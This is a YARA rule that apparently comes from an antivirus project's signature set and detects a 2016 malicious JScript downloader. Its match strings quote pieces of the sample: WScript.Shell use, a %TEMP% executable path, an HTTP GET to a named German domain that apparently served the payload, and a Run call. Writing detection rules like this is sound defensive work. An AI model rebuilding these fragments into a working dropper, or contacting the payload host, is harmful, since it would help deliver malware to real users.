rule sig_20160328_955e47ef1a541fa52ef519fcb85fd422 {
  meta:
    description = "datamaliciousorder - file 20160328_955e47ef1a541fa52ef519fcb85fd422.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff6568a20477318e835b1efa0a30a24211c2c13cb07fd5039114b12dc813215e"

  strings:
    $s1  = "function Ddutqf() {return Mslpzlitqk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9dfEZ2n1wmJ.exe\";};" fullword ascii
    $s2  = "do {WScript[Vcbuy](Qggqgiant() * 11)} while (Kwuhxsaj[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Mslpzlitqk = function Dcbbh() {return WScript[Nnkztpcy](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Kwuhxsaj[Xidvkxzyus](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "function Hpebawrew(Dzmlbs, Fdodtygv){return Dzmlbs - Fdodtygv;};" fullword ascii
    $s6  = "function Dvmoa() {return ((Jqsbsnytf == true) && (Jqsbsnytf == Ftchpjzt)) ? 1 : Vsadj;};" fullword ascii
    $s7  = "function Samiufb(Ufljaeosk){Mslpzlitqk[\"Run\"](Ufljaeosk, Vsadj, Vsadj);};" fullword ascii
    $s8  = "Ftchpjzt = true; " fullword ascii
    $s9  = "function Qggqgiant(){return 22;};" fullword ascii
    $s10 = " while (Vgpzudac){" fullword ascii
    $s11 = "function Rpxrkvbp(){return Nnkztpcy;};" fullword ascii
    $s12 = "var Jqsbsnytf = false;" fullword ascii
    $s13 = "function Aoamwrn(Wdxhaxor) {var Kppnsonyyn = (1, 2, 3, 4, 5, Wdxhaxor); return Kppnsonyyn;};" fullword ascii
    $s14 = "function Oanas()" fullword ascii
    $s15 = "var Andvdodyg = false;" fullword ascii
    $s16 = "var Ntrvfi = new this[\"Date\"]();" fullword ascii
    $s17 = "var Ftchpjzt = false;" fullword ascii
    $s18 = "Jqsbsnytf = true; " fullword ascii
    $s19 = "function Sepxcyz(){return Bibvof;};" fullword ascii
    $s20 = "return Hpebawrew(Guvjr, Xgnpaw);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}